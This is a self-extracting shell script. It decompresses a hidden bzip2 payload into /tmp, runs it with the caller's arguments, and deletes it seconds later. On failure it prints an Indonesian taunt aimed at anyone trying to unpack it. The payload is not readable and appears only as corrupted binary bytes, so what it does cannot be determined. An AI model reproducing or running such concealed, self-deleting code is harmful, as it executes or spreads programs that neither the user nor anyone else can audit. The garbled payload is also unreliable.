#!/bin/sh
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? $0; exit 1
fi; exit $res
BZh91AY&SY��:� O��p1 ���?�ݮ����`z�٤��!ET "��&�=CA�4h@ �   �hi���FA�����2h&F!�4��#CL��##C 14d�L�C	&ST�D�)���m)䇔��x�4�PQ����c��M44���# ����M4�#�D� � �a���h�=C&G�y'�F�S��:��y���C�?��O|�V�;r���g/p$��1Y��lD4��Q��S+����m����8�Y2�N��9�z�	*���n�����>��b�02X(I �m�&�X �W���z������-�a��p���p��~��g��a5ꊎO٘��<(g��{T�_��#��n�!��sL���6�u]���/��t&�������WS2�Y�ϔ�Y`�� �+�j�<�*)' 3�a1���]�.���97�Snn��wA;\��ei9�I{`�_�qKo��t�YRD�7|��:i��ޑ�E�����F���H'$$�GA�1+6���{�C�0"hf��t��}�fb?pAT"ˠ����.����������J �Ξ����m2���Mk9+|č+��R�v(g�]�tm�I�P�J�; 	�y˟��0B&�����$� cA|`�l<�<��&1L>p;n�v�kJ>q`�zb��Y��I�
��m���$`u-���Aq(0x;p1@�k�����0ѐr(���j%q!�h�U��j�!f����*`M�Q�C @I�d(�¢H������{�lO��41K&��D2~bɯ�HG��&D�6����|����XHE��]��;�G����ᑢBE,�g4g��	"����Fy��u�dTB�/CG��ʐ�2~�����
|��c���$#��?�Rl@6	���B3ƀ����}e��Hs���v�"Ս�2K+>������X���{vr����ː��2�.�}7߷��QV��&ڦA��f'xG�/U4��I �6�H����ڍ�ԏ��!��2#�Яz0�bl��*HCP�3�T4� �F���b3�$���Hı² �VqT�HF������BF%��fH�
.��cSPc���!�:�>mܴn��_!;�e!O�@d(��D������� b1<�B��� W���֐~)�R���֚M<��ْ�|`̐�\����V/�q��)lpg4LI���b��ډub�� V�p�G`y�7����"ڞ^%�Hj�3�H��Y}8����"b���T1SOЍ޹��C��S�7���в=��u��U�BF�ڴ�Ћ�۔ �HRM
�Z�P0���?$��צ0��կy�$�� kK��0ն7�`{+N����Ԛ� |�n9G�C�� �Z�ݵS���g�Y�b�@����,ec�b�DCu��Pu0.�~s��B��#0���)�4�I|	�).C�Ri	"�;D�6��,	2��p5����4,�ؑ�M0�Oe��	��Fd�2�h��s
��P�ٛ	��@��1M`l��ӉJ����x�U���y&ج���B����)0;��B�en��ZA�����6��2 od��ڭ�� u�;�;@�K�Q�sf'e�)�s�_ ���:���1�ވɜa*�*1�8JO�K�Y����޵�A� G���A�r���[�.9��Rp�'e�I���U��/�ӆ���4����Xۮr8a_�>(PH���D R1��Y��k���F�Z��6��o�J��Y.r�6�ʹ�Ds^t��8�����+�uj��X�R�@2j�z�
�D��
9��<)�����1�.���0��w$S�	�㯀